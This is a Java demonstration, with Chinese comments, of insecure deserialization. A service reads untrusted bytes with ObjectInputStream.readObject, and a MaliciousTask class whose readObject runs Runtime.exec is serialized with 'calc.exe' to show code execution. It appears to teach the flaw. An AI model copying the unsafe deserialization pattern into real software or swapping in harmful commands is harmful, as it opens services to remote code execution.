import java.io.*;
import java.util.*;

// 领域模型
interface Task extends Serializable {
    void execute();
}

class DataProcessingTask implements Task {
    private String datasetPath;
    private Map<String, String> config;

    public DataProcessingTask(String datasetPath, Map<String, String> config) {
        this.datasetPath = datasetPath;
        this.config = config;
    }

    @Override
    public void execute() {
        System.out.println("Processing dataset: " + datasetPath);
        System.out.println("With config: " + config);
    }
}

// 领域服务
class TaskProcessingService {
    public void handleIncomingTask(InputStream input) {
        try (ObjectInputStream ois = new ObjectInputStream(input)) {
            Task task = (Task) ois.readObject();  // 漏洞触发点
            task.execute();
        } catch (Exception e) {
            System.err.println("Task processing failed: " + e);
        }
    }
}

// 基础设施
class TaskReceiver {
    private TaskProcessingService processingService = new TaskProcessingService();

    public void receiveTask(byte[] serializedTask) {
        try (InputStream bais = new ByteArrayInputStream(serializedTask)) {
            processingService.handleIncomingTask(bais);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

// 恶意攻击示例类
class MaliciousTask implements Task {
    private String command;

    public MaliciousTask(String command) {
        this.command = command;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 恶意代码执行
        Runtime.getRuntime().exec(command);
    }

    @Override
    public void execute() {}
}

// 主程序模拟
public class DeserializationVulnerability {
    public static void main(String[] args) {
        // 正常任务序列化
        Task normalTask = new DataProcessingTask("/data/bigdata.csv", 
            new HashMap<>(Map.of("mode", "parallel")));

        // 模拟网络传输
        byte[] maliciousPayload = createMaliciousPayload();
        
        // 恶意攻击演示
        new TaskReceiver().receiveTask(maliciousPayload);
    }

    private static byte[] createMaliciousPayload() {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            // 构造恶意任务
            oos.writeObject(new MaliciousTask("calc.exe"));  // Windows示例
            return baos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}